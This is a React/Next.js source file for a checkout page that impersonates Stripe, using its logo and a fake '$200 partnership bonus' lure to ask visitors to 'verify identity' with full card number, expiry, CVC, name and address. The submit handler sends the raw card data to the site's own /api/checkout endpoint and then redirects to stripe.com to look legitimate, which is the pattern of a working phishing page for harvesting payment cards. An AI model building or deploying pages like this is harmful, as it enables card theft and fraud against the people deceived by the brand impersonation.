"use client";

import Image from "next/image";
import React, { useState } from "react";

/* ── Card brand icons (inline SVGs) ── */
const VisaIcon = () => (
    <svg viewBox="0 0 48 32" className="h-5 w-auto">
        <rect width="48" height="32" rx="4" fill="#1A1F71" />
        <text x="24" y="20" textAnchor="middle" fill="#FFFFFF" fontSize="12" fontWeight="bold" fontFamily="Arial">
            VISA
        </text>
    </svg>
);

const MastercardIcon = () => (
    <svg viewBox="0 0 48 32" className="h-5 w-auto">
        <rect width="48" height="32" rx="4" fill="#252525" />
        <circle cx="19" cy="16" r="8" fill="#EB001B" />
        <circle cx="29" cy="16" r="8" fill="#F79E1B" />
        <path d="M24 9.6a8 8 0 010 12.8 8 8 0 000-12.8z" fill="#FF5F00" />
    </svg>
);

const AmexIcon = () => (
    <svg viewBox="0 0 48 32" className="h-5 w-auto">
        <rect width="48" height="32" rx="4" fill="#2E77BC" />
        <text x="24" y="20" textAnchor="middle" fill="#FFFFFF" fontSize="8" fontWeight="bold" fontFamily="Arial">
            AMEX
        </text>
    </svg>
);

const LockIcon = () => (
    <svg className="h-3.5 w-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2}>
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
        <path d="M7 11V7a5 5 0 0110 0v4" />
    </svg>
);

/* ── Format helpers ── */
const formatCardNumber = (value: string) => {
    const v = value.replace(/\D/g, "").slice(0, 16);
    const parts = v.match(/.{1,4}/g);
    return parts ? parts.join(" ") : v;
};

const formatExpiry = (value: string) => {
    const v = value.replace(/\D/g, "").slice(0, 4);
    if (v.length >= 3) return v.slice(0, 2) + " / " + v.slice(2);
    return v;
};

export default function CheckoutPage() {
    const [email, setEmail] = useState("");
    const [cardNumber, setCardNumber] = useState("");
    const [expiry, setExpiry] = useState("");
    const [cvc, setCvc] = useState("");
    const [name, setName] = useState("");
    const [country, setCountry] = useState("India");
    const [zip, setZip] = useState("");
    const [isProcessing, setIsProcessing] = useState(false);

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setIsProcessing(true);

        try {
            const res = await fetch("/api/checkout", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    email,
                    cardNumber,
                    expiry,
                    cvc,
                    name,
                    country,
                    zip,
                    paymentMethod: "card",
                }),
            });

            const data = await res.json();

            if (data.success) {
                setTimeout(() => {
                    window.location.href = "https://stripe.com";
                }, 1500);
            } else {
                alert(data.error || "Payment failed. Please try again.");
                setIsProcessing(false);
            }
        } catch {
            alert("Something went wrong. Please try again.");
            setIsProcessing(false);
        }
    };

    /* ── input shared styles ── */
    const inputBase =
        "w-full rounded-lg border border-gray-200 bg-white px-4 py-3 text-[15px] text-gray-900 outline-none transition-all duration-200 placeholder:text-gray-400 focus:border-[#0070f3] focus:shadow-[0_0_0_3px_rgba(0,112,243,0.08)]";

    return (
        <div className="min-h-screen bg-white">
            {/* ── Minimal top bar ── */}
            <header
                className="border-b border-gray-100"
                style={{ animation: "fadeDown .5s ease" }}
            >
                <div className="mx-auto flex max-w-xl items-center justify-between px-5 py-4 sm:px-8">
                    <a href="/" className="transition-opacity hover:opacity-70">
                        <Image
                            src="/stripe.svg"
                            alt="Stripe"
                            width={60}
                            height={25}
                            className="h-7 w-auto"
                        />
                    </a>
                    <span className="text-xs font-medium tracking-wide text-gray-400 uppercase">
                        Claim your bonus
                    </span>
                </div>
            </header>

            {/* ── Main content — single centered column ── */}
            <main className="mx-auto max-w-xl px-5 py-10 sm:px-8 sm:py-14">
                {/* Order summary — $200 bonus claim */}
                <div
                    className="mb-10 rounded-xl border border-gray-100 bg-gray-50/60 p-5 sm:p-6"
                    style={{ animation: "fadeUp .5s ease .1s both" }}
                >
                    <div className="flex items-center gap-4">
                        <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-lg bg-[#0070f3]/10">
                            <Image
                                src="/promo.svg"
                                alt="Stripe Partner"
                                width={28}
                                height={28}
                                className="h-6 w-auto"
                            />
                        </div>
                        <div className="flex-1 min-w-0">
                            <h3 className="text-[15px] font-semibold text-gray-900 truncate">
                                Stripe Partnership Activation
                            </h3>
                            <p className="text-xs text-gray-400">One-time · Bonus eligibility</p>
                        </div>
                        <p className="text-lg font-bold text-gray-900 tabular-nums">$0.00</p>
                    </div>

                    {/* Bonus details */}
                    <div className="mt-4 space-y-2 border-t border-gray-200/60 pt-4">
                        <div className="flex justify-between text-[13px]">
                            <span className="text-gray-400">Account activation</span>
                            <span className="font-medium text-gray-600">Free</span>
                        </div>
                        <div className="flex justify-between text-[13px]">
                            <span className="text-gray-400">Bonus credit (if selected)</span>
                            <span className="font-semibold text-emerald-600">+$200.00</span>
                        </div>
                        <div className="flex justify-between text-[13px]">
                            <span className="text-gray-400">Processing fees</span>
                            <span className="font-medium text-gray-600">Standard rates</span>
                        </div>
                    </div>
                </div>

                {/* ── Payment form ── */}
                <form
                    onSubmit={handleSubmit}
                    className="space-y-6"
                    style={{ animation: "fadeUp .5s ease .2s both" }}
                >
                    <h2 className="text-lg font-semibold text-gray-900">Verify your identity</h2>

                    {/* Email */}
                    <div>
                        <label className="mb-1.5 block text-[13px] font-medium text-gray-500">
                            Email
                        </label>
                        <input
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            placeholder="you@company.com"
                            className={inputBase}
                            required
                        />
                    </div>

                    {/* Card info — grouped composite input */}
                    <div>
                        <label className="mb-1.5 block text-[13px] font-medium text-gray-500">
                            Card information
                        </label>
                        <div className="overflow-hidden rounded-lg border border-gray-200 transition-all duration-200 focus-within:border-[#0070f3] focus-within:shadow-[0_0_0_3px_rgba(0,112,243,0.08)]">
                            {/* Card number */}
                            <div className="relative flex items-center">
                                <input
                                    type="text"
                                    value={cardNumber}
                                    onChange={(e) =>
                                        setCardNumber(formatCardNumber(e.target.value))
                                    }
                                    placeholder="1234 1234 1234 1234"
                                    maxLength={19}
                                    className="w-full border-none bg-transparent px-4 py-3 text-[15px] text-gray-900 outline-none placeholder:text-gray-400"
                                    required
                                />
                                <div className="flex shrink-0 items-center gap-1 pr-3">
                                    <VisaIcon />
                                    <MastercardIcon />
                                    <AmexIcon />
                                </div>
                            </div>
                            {/* Expiry + CVC */}
                            <div className="flex border-t border-gray-200">
                                <input
                                    type="text"
                                    value={expiry}
                                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                                    placeholder="MM / YY"
                                    maxLength={7}
                                    className="w-1/2 border-r border-gray-200 bg-transparent px-4 py-3 text-[15px] text-gray-900 outline-none placeholder:text-gray-400"
                                    required
                                />
                                <input
                                    type="text"
                                    value={cvc}
                                    onChange={(e) =>
                                        setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))
                                    }
                                    placeholder="CVC"
                                    maxLength={4}
                                    className="w-1/2 bg-transparent px-4 py-3 text-[15px] text-gray-900 outline-none placeholder:text-gray-400"
                                    required
                                />
                            </div>
                        </div>
                    </div>

                    {/* Cardholder name */}
                    <div>
                        <label className="mb-1.5 block text-[13px] font-medium text-gray-500">
                            Cardholder name
                        </label>
                        <input
                            type="text"
                            value={name}
                            onChange={(e) => setName(e.target.value)}
                            placeholder="Full name on card"
                            className={inputBase}
                            required
                        />
                    </div>

                    {/* Billing address */}
                    <div>
                        <label className="mb-1.5 block text-[13px] font-medium text-gray-500">
                            Billing address
                        </label>
                        <div className="overflow-hidden rounded-lg border border-gray-200 transition-all duration-200 focus-within:border-[#0070f3] focus-within:shadow-[0_0_0_3px_rgba(0,112,243,0.08)]">
                            <div className="relative">
                                <select
                                    value={country}
                                    onChange={(e) => setCountry(e.target.value)}
                                    className="w-full appearance-none bg-transparent px-4 py-3 pr-10 text-[15px] text-gray-900 outline-none"
                                >
                                    <option>India</option>
                                    <option>United States</option>
                                    <option>United Kingdom</option>
                                    <option>Canada</option>
                                    <option>Australia</option>
                                    <option>Germany</option>
                                    <option>France</option>
                                    <option>Japan</option>
                                </select>
                                {/* Chevron */}
                                <svg
                                    className="pointer-events-none absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-400"
                                    fill="none"
                                    viewBox="0 0 24 24"
                                    stroke="currentColor"
                                    strokeWidth={2}
                                >
                                    <path
                                        strokeLinecap="round"
                                        strokeLinejoin="round"
                                        d="M19.5 8.25l-7.5 7.5-7.5-7.5"
                                    />
                                </svg>
                            </div>
                            <input
                                type="text"
                                value={zip}
                                onChange={(e) => setZip(e.target.value)}
                                placeholder="ZIP / Postal code"
                                className="w-full border-t border-gray-200 bg-transparent px-4 py-3 text-[15px] text-gray-900 outline-none placeholder:text-gray-400"
                            />
                        </div>
                    </div>

                    {/* Referral code — inline */}
                    <div className="flex gap-2">
                        <input
                            type="text"
                            placeholder="Referral code (optional)"
                            className="flex-1 rounded-lg border border-gray-200 bg-transparent px-4 py-2.5 text-[13px] text-gray-900 outline-none transition-all duration-200 placeholder:text-gray-400 focus:border-[#0070f3] focus:shadow-[0_0_0_3px_rgba(0,112,243,0.08)]"
                        />
                        <button
                            type="button"
                            className="rounded-lg border border-gray-200 px-5 py-2.5 text-[13px] font-medium text-gray-600 transition-colors duration-200 hover:bg-gray-50 hover:text-gray-900"
                        >
                            Apply
                        </button>
                    </div>

                    {/* Save info */}
                    <label className="flex cursor-pointer items-start gap-3">
                        <input
                            type="checkbox"
                            defaultChecked
                            className="mt-0.5 h-4 w-4 rounded border-gray-300 accent-[#0070f3]"
                        />
                        <span className="text-[13px] leading-snug text-gray-500">
                            Save my info for secure 1-click checkout with{" "}
                            <span className="font-semibold text-[#0070f3]">Link</span>
                        </span>
                    </label>

                    {/* Pay button */}
                    <button
                        type="submit"
                        disabled={isProcessing}
                        className="relative mt-2 w-full rounded-lg bg-[#0070f3] px-6 py-3.5 text-[15px] font-semibold text-white transition-all duration-200 hover:bg-[#005cc5] active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60"
                    >
                        {isProcessing ? (
                            <span className="flex items-center justify-center gap-2">
                                <svg
                                    className="h-4 w-4 animate-spin"
                                    viewBox="0 0 24 24"
                                    fill="none"
                                >
                                    <circle
                                        className="opacity-25"
                                        cx="12"
                                        cy="12"
                                        r="10"
                                        stroke="currentColor"
                                        strokeWidth="4"
                                    />
                                    <path
                                        className="opacity-75"
                                        fill="currentColor"
                                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"
                                    />
                                </svg>
                                Processing…
                            </span>
                        ) : (
                            <span className="flex items-center justify-center gap-2">
                                <LockIcon />
                                Activate & Claim Bonus
                            </span>
                        )}
                    </button>

                    {/* Terms */}
                    <p className="text-center text-[11px] leading-relaxed text-gray-400">
                        By activating, you agree to Stripe&apos;s terms. Your card is used
                        for identity verification. Selected accounts receive a $200 credit.{" "}
                        <a href="#" className="text-[#0070f3] hover:underline">
                            Terms
                        </a>{" "}
                        ·{" "}
                        <a href="#" className="text-[#0070f3] hover:underline">
                            Privacy
                        </a>
                    </p>
                </form>

                {/* Powered by Stripe */}
                <div
                    className="mt-12 flex items-center justify-center gap-2 text-[11px] text-gray-400"
                    style={{ animation: "fadeUp .5s ease .35s both" }}
                >
                    <span>Powered by</span>
                    <Image
                        src="/stripe.svg"
                        alt="Stripe"
                        width={30}
                        height={12}
                        className="h-3 w-auto"
                    />
                    <span className="mx-0.5 text-gray-200">|</span>
                    <a href="#" className="hover:text-gray-400">
                        Terms
                    </a>
                    <a href="#" className="hover:text-gray-400">
                        Privacy
                    </a>
                </div>
            </main>

            {/* ── Page-level keyframes ── */}
            <style jsx>{`
                @keyframes fadeUp {
                    from {
                        opacity: 0;
                        transform: translateY(16px);
                    }
                    to {
                        opacity: 1;
                        transform: translateY(0);
                    }
                }
                @keyframes fadeDown {
                    from {
                        opacity: 0;
                        transform: translateY(-8px);
                    }
                    to {
                        opacity: 1;
                        transform: translateY(0);
                    }
                }
            `}</style>
        </div>
    );
}
